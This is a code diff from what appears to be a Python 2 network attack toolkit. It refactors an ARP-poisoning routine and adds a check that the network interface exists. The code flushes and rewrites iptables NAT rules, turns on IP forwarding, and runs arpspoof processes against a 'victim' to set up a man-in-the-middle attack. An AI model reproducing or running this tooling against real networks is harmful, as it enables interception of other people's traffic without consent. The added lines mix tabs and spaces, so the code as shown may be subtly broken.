@@ -30,11 +30,11 @@ defaultint="wlan0"         #INTERFACE_DEVICE
 IPs=[]
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
  
-def run(para,parb,parc):
+def run(target, source, interface):
     global defaultgat,defaultipv,defaultint
-    defaultipv=para
-    defaultgat=parb
-    defaultint=parc
+    defaultipv=target
+    defaultgat=source
+    defaultint=interface
     arpp(1)
 
 def arpp(run): 
@@ -105,32 +105,35 @@ def arpp(run):
             d.run()
             try:
 		My_Ip=ping.myip()
-		Tables="""
-iptables --flush;
-iptables --zero;
-iptables --delete-chain;
-iptables -F -t nat;
-iptables --append FORWARD --in-interface """+defaultint+""" --jump ACCEPT;
-iptables --table nat --append POSTROUTING --out-interface """+defaultint+""";
-"""
+		if ping.checkDevice(defaultint):
+			Tables="""
+	iptables --flush;
+	iptables --zero;
+	iptables --delete-chain;
+	iptables -F -t nat;
+	iptables --append FORWARD --in-interface """+defaultint+""" --jump ACCEPT;
+	iptables --table nat --append POSTROUTING --out-interface """+defaultint+""";
+	"""
 
-                print " "+Alr+" Ensure the victim recieves packets by forwarding them",ping.status_cmd('echo 1 > /proc/sys/net/ipv4/ip_forward','\t')
-                print " "+Alr+" Configuring IPtables NAT",ping.status_cmd(Tables,'\t\t\t\t')
-                print " "+Alr+" Starting ARP Poisoning..."
-                try:
-                    z=multiprocessing.Process(target=Get_PoisoningTTG)
-                    t=multiprocessing.Process(target=Get_PoisoningTGT)
-                    t.start()
-                    z.start()
-                    NULL=raw_input(" "+Hlp+" Stop Attack ARP (PRESS ANY KEY)")
-                    print " "+Alr+" Stopping ARP Poisoning...", ping.status_cmd('killall arpspoof','\t\t\t\t')
-                    print " "+Alr+" Setting Normal configuration in forwarding",ping.status_cmd('echo 0 > /proc/sys/net/ipv4/ip_forward','\t\t')
-                    t.terminate()
-                    z.terminate()  
-                    d.space()
-                    arpp(0)
-                except:
-                    Errors.Errors(event=sys.exc_info(), info=False)
+		        print " "+Alr+" Ensure the victim recieves packets by forwarding them",ping.status_cmd('echo 1 > /proc/sys/net/ipv4/ip_forward','\t')
+		        print " "+Alr+" Configuring IPtables NAT",ping.status_cmd(Tables,'\t\t\t\t')
+		        print " "+Alr+" Starting ARP Poisoning..."
+		        try:
+		            z=multiprocessing.Process(target=Get_PoisoningTTG)
+		            t=multiprocessing.Process(target=Get_PoisoningTGT)
+		            t.start()
+		            z.start()
+		            NULL=raw_input(" "+Hlp+" Stop Attack ARP (PRESS ANY KEY)")
+		            print " "+Alr+" Stopping ARP Poisoning...", ping.status_cmd('killall arpspoof','\t\t\t\t')
+		            print " "+Alr+" Setting Normal configuration in forwarding",ping.status_cmd('echo 0 > /proc/sys/net/ipv4/ip_forward','\t\t')
+		            t.terminate()
+		            z.terminate()  
+		            d.space()
+		            arpp(0)
+		        except:
+		            Errors.Errors(event=sys.exc_info(), info=False)
+		else:
+			d.NoDeviceFound(defaultint)
             except:
                 Errors.Errors(event=sys.exc_info(), info=False)
         else:
